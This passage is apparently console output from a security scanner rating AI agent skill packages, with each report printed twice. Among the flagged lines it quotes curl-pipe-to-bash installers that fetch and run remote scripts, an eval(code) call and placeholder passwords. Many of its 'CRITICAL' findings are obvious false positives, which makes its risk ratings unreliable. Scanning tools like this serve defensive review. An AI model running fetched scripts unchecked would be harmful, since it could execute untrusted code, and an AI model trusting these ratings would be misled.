    Pattern: echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USER...
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:520
    Pattern: aws ecr get-login-password --region us-east-1 | docker login --username AWS -...
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:97
    Pattern: database_password: "changeme"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:98
    Pattern: api_key: "secret-api-key"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:130
    Pattern: - name: DATABASE_PASSWORD
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:134
    Pattern: key: database_password
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:242
    Pattern: - name: POSTGRES_PASSWORD
    Confidence: MEDIUM
  and 6 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 16
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/containerization-assistant.html
Scanning: containerization-assistant

[*] Scanning Skill: containerization-assistant

[!!] Risk Level: HIGH (6.9/10)

[!] CRITICAL Issues (16):
  [FILE001] in containerization-assistant/SKILL.md:36
    Pattern: cp assets/.env.example ./.env
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:86
    Pattern: **Environment template** (`assets/.env.example`):
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:384
    Pattern: api_key: "secret-key"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:506
    Pattern: echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USER...
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/SKILL.md:520
    Pattern: aws ecr get-login-password --region us-east-1 | docker login --username AWS -...
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:97
    Pattern: database_password: "changeme"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:98
    Pattern: api_key: "secret-api-key"
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:130
    Pattern: - name: DATABASE_PASSWORD
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:134
    Pattern: key: database_password
    Confidence: MEDIUM
  [FILE001] in containerization-assistant/references/kubernetes_patterns.md:242
    Pattern: - name: POSTGRES_PASSWORD
    Confidence: MEDIUM
  and 6 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 16
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/containerization-assistant.json
Scanning: control-flow-abstraction-generator

[*] Scanning Skill: control-flow-abstraction-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/control-flow-abstraction-generator.html
Scanning: control-flow-abstraction-generator

[*] Scanning Skill: control-flow-abstraction-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/control-flow-abstraction-generator.json
Scanning: counterexample-debugger

[*] Scanning Skill: counterexample-debugger

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/counterexample-debugger.html
Scanning: counterexample-debugger

[*] Scanning Skill: counterexample-debugger

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/counterexample-debugger.json
Scanning: counterexample-explainer

[*] Scanning Skill: counterexample-explainer

[?] Risk Level: MEDIUM (4.1/10)

[!] CRITICAL Issues (9):
  [FILE001] in counterexample-explainer/references/specification-types.md:129
    Pattern: As a user, I want to reset my password so that I can regain access to my acco...
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:132
    Pattern: - Password reset link expires after 24 hours
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:134
    Pattern: - New password must be different from old password
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:139
    Pattern: Actual: Password reset allowed
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:149
    Pattern: Action: Failed login with wrong password
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:321
    Pattern: Specification: Passwords must be hashed
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:324
    Pattern: User password: "secret123"
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:325
    Pattern: Database: password column contains "secret123"
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:326
    Pattern: Violation: Password stored in plain text
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/counterexample-explainer.html
Scanning: counterexample-explainer

[*] Scanning Skill: counterexample-explainer

[?] Risk Level: MEDIUM (4.1/10)

[!] CRITICAL Issues (9):
  [FILE001] in counterexample-explainer/references/specification-types.md:129
    Pattern: As a user, I want to reset my password so that I can regain access to my acco...
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:132
    Pattern: - Password reset link expires after 24 hours
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:134
    Pattern: - New password must be different from old password
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:139
    Pattern: Actual: Password reset allowed
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:149
    Pattern: Action: Failed login with wrong password
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:321
    Pattern: Specification: Passwords must be hashed
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:324
    Pattern: User password: "secret123"
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:325
    Pattern: Database: password column contains "secret123"
    Confidence: MEDIUM
  [FILE001] in counterexample-explainer/references/specification-types.md:326
    Pattern: Violation: Password stored in plain text
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 9
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 9

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/counterexample-explainer.json
Scanning: counterexample-generator

[*] Scanning Skill: counterexample-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/counterexample-generator.html
Scanning: counterexample-generator

[*] Scanning Skill: counterexample-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/counterexample-generator.json
Scanning: coverage-enhancer

[*] Scanning Skill: coverage-enhancer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/coverage-enhancer.html
Scanning: coverage-enhancer

[*] Scanning Skill: coverage-enhancer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/coverage-enhancer.json
Scanning: cpp-to-dafny-translator

[*] Scanning Skill: cpp-to-dafny-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/cpp-to-dafny-translator.html
Scanning: cpp-to-dafny-translator

[*] Scanning Skill: cpp-to-dafny-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/cpp-to-dafny-translator.json
Scanning: critical-interval-security-checker

[*] Scanning Skill: critical-interval-security-checker

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (142):
  [FILE001] in critical-interval-security-checker/SKILL.md:3
    Pattern: description: Analyzes code to identify security-critical time intervals and t...
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:15
    Pattern: - **Authentication**: Login, logout, token generation
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:17
    Pattern: - **Password operations**: Reset tokens, change requests
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:18
    Pattern: - **Rate limiting**: Login attempts, API calls, password resets
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:19
    Pattern: - **Token operations**: JWT, OAuth tokens, API keys
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:65
    Pattern: token_expiry = datetime.utcnow() + timedelta(hours=1)
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:71
    Pattern: if datetime.utcnow() > token_expiry:
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:72
    Pattern: raise TokenExpiredError()
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:77
    Pattern: # Good: 1-hour reset token
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:78
    Pattern: RESET_TOKEN_EXPIRY = timedelta(hours=1)
    Confidence: MEDIUM
  and 132 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 142
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 142

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/critical-interval-security-checker.html
Scanning: critical-interval-security-checker

[*] Scanning Skill: critical-interval-security-checker

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (142):
  [FILE001] in critical-interval-security-checker/SKILL.md:3
    Pattern: description: Analyzes code to identify security-critical time intervals and t...
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:15
    Pattern: - **Authentication**: Login, logout, token generation
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:17
    Pattern: - **Password operations**: Reset tokens, change requests
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:18
    Pattern: - **Rate limiting**: Login attempts, API calls, password resets
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:19
    Pattern: - **Token operations**: JWT, OAuth tokens, API keys
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:65
    Pattern: token_expiry = datetime.utcnow() + timedelta(hours=1)
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:71
    Pattern: if datetime.utcnow() > token_expiry:
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:72
    Pattern: raise TokenExpiredError()
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:77
    Pattern: # Good: 1-hour reset token
    Confidence: MEDIUM
  [FILE001] in critical-interval-security-checker/SKILL.md:78
    Pattern: RESET_TOKEN_EXPIRY = timedelta(hours=1)
    Confidence: MEDIUM
  and 132 more

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 142
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 142

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/critical-interval-security-checker.json
Scanning: dead-code-eliminator

[*] Scanning Skill: dead-code-eliminator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in dead-code-eliminator/scripts/find_unused_functions.py:136
    Pattern: for filepath in sorted(unused.keys()):
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/dead-code-eliminator.html
Scanning: dead-code-eliminator

[*] Scanning Skill: dead-code-eliminator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in dead-code-eliminator/scripts/find_unused_functions.py:136
    Pattern: for filepath in sorted(unused.keys()):
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/dead-code-eliminator.json
Scanning: dependency-resolver

[*] Scanning Skill: dependency-resolver

[OK] Risk Level: SAFE (0.7/10)

[!] CRITICAL Issues (1):
  [CMD001] in dependency-resolver/SKILL.md:779
    Pattern: sudo apt-get install build-essential python3
    Confidence: MEDIUM

[*] WARNING Issues (2):
  [DEP001] in dependency-resolver/SKILL.md:776
    Pattern: npm install -g node-gyp
    Confidence: MEDIUM
  [DEP002] in dependency-resolver/SKILL.md:537
    Pattern: pip install --upgrade package-name
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/dependency-resolver.html
Scanning: dependency-resolver

[*] Scanning Skill: dependency-resolver

[OK] Risk Level: SAFE (0.7/10)

[!] CRITICAL Issues (1):
  [CMD001] in dependency-resolver/SKILL.md:779
    Pattern: sudo apt-get install build-essential python3
    Confidence: MEDIUM

[*] WARNING Issues (2):
  [DEP001] in dependency-resolver/SKILL.md:776
    Pattern: npm install -g node-gyp
    Confidence: MEDIUM
  [DEP002] in dependency-resolver/SKILL.md:537
    Pattern: pip install --upgrade package-name
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/dependency-resolver.json
Scanning: deprecated-api-updater

[*] Scanning Skill: deprecated-api-updater

[?] Risk Level: LOW (2.5/10)

[!] CRITICAL Issues (5):
  [FILE001] in deprecated-api-updater/references/java_deprecations.md:340
    Pattern: conn = DriverManager.getConnection(url, user, password);
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/java_deprecations.md:349
    Pattern: try (Connection conn = DriverManager.getConnection(url, user, password)) {
    Confidence: MEDIUM
  [NET001] in deprecated-api-updater/references/javascript_deprecations.md:372
    Pattern: fetch('/api/data');
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/javascript_deprecations.md:39
    Pattern: const cipher = crypto.createCipher('aes192', 'password');
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/javascript_deprecations.md:43
    Pattern: const key = crypto.scryptSync('password', 'salt', 32);
    Confidence: MEDIUM

[*] WARNING Issues (2):
  [CMD002] in deprecated-api-updater/references/python_deprecations.md:42
    Pattern: result = subprocess.run('ls', shell=True, capture_output=True, text=True)
    Confidence: MEDIUM
  [CMD002] in deprecated-api-updater/scripts/replace_deprecated_apis.py:35
    Pattern: (r'\bos\.popen\(([^)]+)\)', r'subprocess.run(\1, shell=True, capture_output=T...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 5
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/deprecated-api-updater.html
Scanning: deprecated-api-updater

[*] Scanning Skill: deprecated-api-updater

[?] Risk Level: LOW (2.5/10)

[!] CRITICAL Issues (5):
  [FILE001] in deprecated-api-updater/references/java_deprecations.md:340
    Pattern: conn = DriverManager.getConnection(url, user, password);
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/java_deprecations.md:349
    Pattern: try (Connection conn = DriverManager.getConnection(url, user, password)) {
    Confidence: MEDIUM
  [NET001] in deprecated-api-updater/references/javascript_deprecations.md:372
    Pattern: fetch('/api/data');
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/javascript_deprecations.md:39
    Pattern: const cipher = crypto.createCipher('aes192', 'password');
    Confidence: MEDIUM
  [FILE001] in deprecated-api-updater/references/javascript_deprecations.md:43
    Pattern: const key = crypto.scryptSync('password', 'salt', 32);
    Confidence: MEDIUM

[*] WARNING Issues (2):
  [CMD002] in deprecated-api-updater/references/python_deprecations.md:42
    Pattern: result = subprocess.run('ls', shell=True, capture_output=True, text=True)
    Confidence: MEDIUM
  [CMD002] in deprecated-api-updater/scripts/replace_deprecated_apis.py:35
    Pattern: (r'\bos\.popen\(([^)]+)\)', r'subprocess.run(\1, shell=True, capture_output=T...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 5
  Warning Issues: 2
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/deprecated-api-updater.json
Scanning: design-pattern-suggestor

[*] Scanning Skill: design-pattern-suggestor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/design-pattern-suggestor.html
Scanning: design-pattern-suggestor

[*] Scanning Skill: design-pattern-suggestor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/design-pattern-suggestor.json
Scanning: design-smell-detector

[*] Scanning Skill: design-smell-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/design-smell-detector.html
Scanning: design-smell-detector

[*] Scanning Skill: design-smell-detector

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/design-smell-detector.json
Scanning: directed-test-input-generator

[*] Scanning Skill: directed-test-input-generator

[OK] Risk Level: SAFE (1.3/10)

[!] CRITICAL Issues (2):
  [FILE001] in directed-test-input-generator/references/coverage_strategies.md:354
    Pattern: for key in list(mutated.keys()):
    Confidence: MEDIUM
  [INJ001] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM
  [OBF001] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM
  [OBF002] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 2
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/directed-test-input-generator.html
Scanning: directed-test-input-generator

[*] Scanning Skill: directed-test-input-generator

[OK] Risk Level: SAFE (1.3/10)

[!] CRITICAL Issues (2):
  [FILE001] in directed-test-input-generator/references/coverage_strategies.md:354
    Pattern: for key in list(mutated.keys()):
    Confidence: MEDIUM
  [INJ001] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM
  [OBF001] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM
  [OBF002] in directed-test-input-generator/references/llm_patterns.md:474
    Pattern: return eval(code)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 2
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/directed-test-input-generator.json
Scanning: edge-case-generator

[*] Scanning Skill: edge-case-generator

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (6):
  [NET001] in edge-case-generator/references/python_edge_cases.md:489
    Pattern: requests.get("http://example.com")
    Confidence: LOW
  [FILE001] in edge-case-generator/references/python_edge_cases.md:158
    Pattern: # Use list(d.keys()) to avoid RuntimeError
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/python_edge_cases.md:159
    Pattern: for key in list(d.keys()):
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:242
    Pattern: expect(Object.keys(obj)).toEqual(['1', 'true']); // Symbols excluded!
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:255
    Pattern: // Object.keys only returns own properties
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:256
    Pattern: expect(Object.keys(obj)).toEqual(['own']);
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/edge-case-generator.html
Scanning: edge-case-generator

[*] Scanning Skill: edge-case-generator

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (6):
  [NET001] in edge-case-generator/references/python_edge_cases.md:489
    Pattern: requests.get("http://example.com")
    Confidence: LOW
  [FILE001] in edge-case-generator/references/python_edge_cases.md:158
    Pattern: # Use list(d.keys()) to avoid RuntimeError
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/python_edge_cases.md:159
    Pattern: for key in list(d.keys()):
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:242
    Pattern: expect(Object.keys(obj)).toEqual(['1', 'true']); // Symbols excluded!
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:255
    Pattern: // Object.keys only returns own properties
    Confidence: MEDIUM
  [FILE001] in edge-case-generator/references/javascript_edge_cases.md:256
    Pattern: expect(Object.keys(obj)).toEqual(['own']);
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/edge-case-generator.json
Scanning: environment-setup-assistant

[*] Scanning Skill: environment-setup-assistant

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (100):
  [NET001] in environment-setup-assistant/SKILL.md:51
    Pattern: /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install...
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:62
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:349
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:441
    Pattern: /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install...
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:450
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [CMD001] in environment-setup-assistant/SKILL.md:95
    Pattern: if ! command -v python3.11 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:98
    Pattern: # Linux: sudo apt-get install python3.11
    Confidence: MEDIUM
  [CMD001] in environment-setup-assistant/SKILL.md:297
    Pattern: if ! command -v python3 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:368
    Pattern: if command -v $1 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:397
    Pattern: # macOS/Linux: Use sudo for system installations
    Confidence: MEDIUM
  and 90 more

[*] WARNING Issues (4):
  [DEP001] in environment-setup-assistant/SKILL.md:458
    Pattern: npm install -g pnpm typescript ts-node nodemon
    Confidence: MEDIUM
  [DEP001] in environment-setup-assistant/scripts/setup_nodejs.sh:67
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in environment-setup-assistant/scripts/setup_nodejs.sh:74
    Pattern: npm install -g typescript ts-node nodemon eslint prettier
    Confidence: MEDIUM
  [DEP002] in environment-setup-assistant/scripts/setup_python.sh:98
    Pattern: pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 100
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 104

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/environment-setup-assistant.html
Scanning: environment-setup-assistant

[*] Scanning Skill: environment-setup-assistant

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL Issues (100):
  [NET001] in environment-setup-assistant/SKILL.md:51
    Pattern: /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install...
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:62
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:349
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:441
    Pattern: /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install...
    Confidence: MEDIUM
  [NET001] in environment-setup-assistant/SKILL.md:450
    Pattern: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
    Confidence: MEDIUM
  [CMD001] in environment-setup-assistant/SKILL.md:95
    Pattern: if ! command -v python3.11 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:98
    Pattern: # Linux: sudo apt-get install python3.11
    Confidence: MEDIUM
  [CMD001] in environment-setup-assistant/SKILL.md:297
    Pattern: if ! command -v python3 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:368
    Pattern: if command -v $1 &> /dev/null; then
    Confidence: HIGH
  [CMD001] in environment-setup-assistant/SKILL.md:397
    Pattern: # macOS/Linux: Use sudo for system installations
    Confidence: MEDIUM
  and 90 more

[*] WARNING Issues (4):
  [DEP001] in environment-setup-assistant/SKILL.md:458
    Pattern: npm install -g pnpm typescript ts-node nodemon
    Confidence: MEDIUM
  [DEP001] in environment-setup-assistant/scripts/setup_nodejs.sh:67
    Pattern: npm install -g pnpm
    Confidence: MEDIUM
  [DEP001] in environment-setup-assistant/scripts/setup_nodejs.sh:74
    Pattern: npm install -g typescript ts-node nodemon eslint prettier
    Confidence: MEDIUM
  [DEP002] in environment-setup-assistant/scripts/setup_python.sh:98
    Pattern: pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 100
  Warning Issues: 4
  Info Issues: 0
  Total Issues: 104

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/environment-setup-assistant.json
Scanning: error-explanation-generator

[*] Scanning Skill: error-explanation-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (3):
  [NET001] in error-explanation-generator/references/debugging_strategies.md:421
    Pattern: response = requests.get("https://api.example.com")
    Confidence: LOW
  [NET001] in error-explanation-generator/references/debugging_strategies.md:429
    Pattern: response = requests.get("https://api.example.com")
    Confidence: LOW
  [NET001] in error-explanation-generator/references/debugging_strategies.md:537
    Pattern: response = requests.get(url)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/error-explanation-generator.html
Scanning: error-explanation-generator

[*] Scanning Skill: error-explanation-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (3):
  [NET001] in error-explanation-generator/references/debugging_strategies.md:421
    Pattern: response = requests.get("https://api.example.com")
    Confidence: LOW
  [NET001] in error-explanation-generator/references/debugging_strategies.md:429
    Pattern: response = requests.get("https://api.example.com")
    Confidence: LOW
  [NET001] in error-explanation-generator/references/debugging_strategies.md:537
    Pattern: response = requests.get(url)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 3
